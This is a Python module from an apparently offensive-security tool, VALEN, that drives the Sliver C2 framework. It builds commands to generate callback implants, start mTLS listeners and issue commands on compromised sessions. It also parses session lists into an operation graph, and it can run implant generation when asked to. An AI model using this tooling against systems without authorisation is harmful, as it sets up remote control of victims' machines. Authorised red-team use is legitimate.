"""Sliver C2 integration (command builders + output parsing).

VALEN integrates with an existing C2 (Sliver) rather than shipping its own: it
*plans* the sliver-client invocations, parses ``sessions``/``beacons`` output,
and folds live sessions into the operation board (as IR nodes). Execution is the
operator's (via sliver-client) — VALEN never drives an implant directly.
"""

from __future__ import annotations

import json
from typing import Any, Dict, List, Optional

from ...ir import EdgeKind, Graph, NodeKind

CLIENT = "sliver-client"


# -- command builders -------------------------------------------------------
def generate_implant_command(name: str, mtls: str, os: str = "windows",
                             arch: str = "amd64", fmt: str = "exe",
                             save: Optional[str] = None,
                             extra: Optional[List[str]] = None) -> List[str]:
    cmd = [CLIENT, "generate", "--mtls", mtls, "--os", os, "--arch", arch,
           "--format", fmt, "--name", name]
    cmd += ["--save", save or f"{name}.{fmt}"]
    if extra:
        cmd += list(extra)
    return cmd


def start_listener_command(host: str, port: int, protocol: str = "mtls") -> List[str]:
    return [CLIENT, protocol, "--lhost", host, "--lport", str(port)]


def session_command(session_id: str, verb: str, *args: str) -> List[str]:
    """An operator command against a session, e.g. ``session_command(id,'ls','C:\\\\')``."""
    return [CLIENT, "-c", f"use {session_id}; {verb} {' '.join(args)}".strip()]


# -- parsing ----------------------------------------------------------------
def _norm(key: str) -> str:
    return key.replace("_", "").replace("-", "").lower()


def _field(d: Dict[str, Any], *names: str) -> str:
    lut = {_norm(k): v for k, v in d.items()}
    for n in names:
        if _norm(n) in lut:
            v = lut[_norm(n)]
            return v if isinstance(v, str) else json.dumps(v)
    return ""


def parse_sessions(text: str) -> List[Dict[str, Any]]:
    """Parse ``sliver-client sessions -j`` JSON (tolerant, returns [] on text)."""
    text = (text or "").strip()
    if not text:
        return []
    try:
        data = json.loads(text)
    except Exception:
        return []
    if isinstance(data, dict):
        data = data.get("sessions", data.get("beacons", []))
    out = []
    for s in data if isinstance(data, list) else []:
        if not isinstance(s, dict):
            continue
        out.append({
            "id": _field(s, "ID", "SessionID", "id"),
            "name": _field(s, "Name"),
            "hostname": _field(s, "Hostname"),
            "username": _field(s, "Username"),
            "os": _field(s, "OperatingSystem", "OS"),
            "arch": _field(s, "Architecture", "Arch"),
            "remote_address": _field(s, "RemoteAddress"),
            "transport": _field(s, "Transport"),
            "pid": _field(s, "PID"),
        })
    return out


def sessions_to_ir(sessions: List[Dict[str, Any]]) -> Graph:
    """Fold sessions into an IR graph for the operation board."""
    g = Graph()
    g.meta = {"language": "c2", "transport": "sliver"}
    for s in sessions:
        host = s.get("hostname") or s.get("remote_address") or "unknown-host"
        hid = f"host:{host.upper()}"
        sid = f"implant:{s.get('id') or host}"
        if not g.has_node(hid):
            g.add_node(hid, NodeKind.GATE, host, attrs={"im_kind": "host"})
        g.add_node(sid, NodeKind.FUNCTION, s.get("name") or s.get("id") or "implant",
                   attrs={"im_kind": "implant", "os": s.get("os", ""),
                          "user": s.get("username", ""),
                          "transport": s.get("transport", "")})
        g.add_edge(hid, sid, EdgeKind.CONTROL)
    return g


def c2_plan(lhost: str, lport: int, name: str = "sess") -> Dict[str, Any]:
    """A minimal C2 plan: listener + implant build."""
    return {
        "listener": start_listener_command(lhost, lport),
        "implant": generate_implant_command(name, f"{lhost}:{lport}"),
        "note": "run these with sliver-client; VALEN consumes 'sessions -j' output",
    }


class SliverRunner:
    """Optional live driver over ``sliver-client`` (behind --allow-exec)."""

    def __init__(self, timeout: int = 180) -> None:
        self.timeout = timeout

    def available(self) -> bool:
        from ..exec import available

        return available(CLIENT)

    def sessions(self, execute: bool = False) -> Dict[str, Any]:
        cmd = [CLIENT, "sessions", "-j"]
        if not execute:
            return {"command": cmd, "note": "dry-run"}
        from ..exec import run

        res = run(cmd, timeout=self.timeout)
        if "error" in res:
            return res
        return {"sessions": parse_sessions(res.get("stdout", "")),
                "raw": res.get("stdout", "")[:_MAX_RAW]}

    def generate(self, name: str, mtls: str, execute: bool = False,
                 **kw: Any) -> Dict[str, Any]:
        cmd = generate_implant_command(name, mtls, **kw)
        if not execute:
            return {"command": cmd, "note": "dry-run"}
        from ..exec import run

        return run(cmd, timeout=self.timeout)

    def listener(self, host: str, port: int) -> Dict[str, Any]:
        # sliver-client mtls is interactive; return the command for the operator.
        return {"command": start_listener_command(host, port),
                "note": "run interactively to start the listener"}


_MAX_RAW = 2000
